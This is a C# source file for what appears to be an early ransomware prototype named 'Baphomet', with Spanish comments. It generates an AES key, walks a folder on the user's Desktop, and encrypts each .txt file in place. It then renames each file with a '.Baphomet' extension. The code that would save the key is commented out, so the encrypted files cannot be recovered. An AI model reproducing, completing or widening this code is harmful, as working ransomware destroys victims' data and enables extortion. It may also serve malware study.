using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet
{
    public class Program : Decrypt
    {
        static void Main()
        {
            // creo una instancia del algoritmo aes 
            RijndaelManaged aes = new RijndaelManaged();
            aes.Mode = CipherMode.CBC;
            byte[] key = aes.Key;

            var userName = Environment.UserName;
            var computerName = System.Environment.MachineName.ToString();
            var  userDir = "C:\\Users\\" +userName;

            directoryRoad(userDir,aes);
            decryptConfirm(aes);
        }

        //recoro los directorios
        static void directoryRoad(string userdir, SymmetricAlgorithm aes)
        {
           // var Dirs = new[] { "\\Documents", "\\Desktop" };
            var extensionCheck = new[] { ".txt" };
            var targetPath = userdir +"\\Desktop\\test";

            string[] files = Directory.GetFiles(targetPath);
            string[] subDirs = Directory.GetDirectories(targetPath);

            for(int i = 0; i < files.Length; i++)
            {
                var extension = Path.GetExtension(files[i]);
                if (extensionCheck.Contains(extension))
                {
                    encryptFileData(files[i], aes, targetPath);
                }
            }

        }

        //archivo valido para cifrar bytes
        static void encryptFileData(string file, SymmetricAlgorithm aes, string targetPath)
        {
            byte[] encryptFileBites = File.ReadAllBytes(file);

            var encryptedBytes = UseAES(encryptFileBites, aes);
            File.WriteAllBytes(file, encryptedBytes);
            System.IO.File.Move(file, file + ".Baphomet");

            //var saveKey = Convert.ToBase64String(key,0,key.Length);
           // File.WriteAllText(targetPath+"\\yourkey.txt", saveKey);

        }


        //Cifro los bytes de el archivo
        static byte[] UseAES(byte[] fileBytes, SymmetricAlgorithm aes)
        {
            byte[] encryptedBytes = null;

            ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

            using (MemoryStream ms = new MemoryStream())
            {
                
                using (var cryptStream = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                {
                    cryptStream.Write(fileBytes, 0, fileBytes.Length);
                    cryptStream.Close();
                }
                encryptedBytes = ms.ToArray();
              

                return encryptedBytes;
            }
        }
    }
}
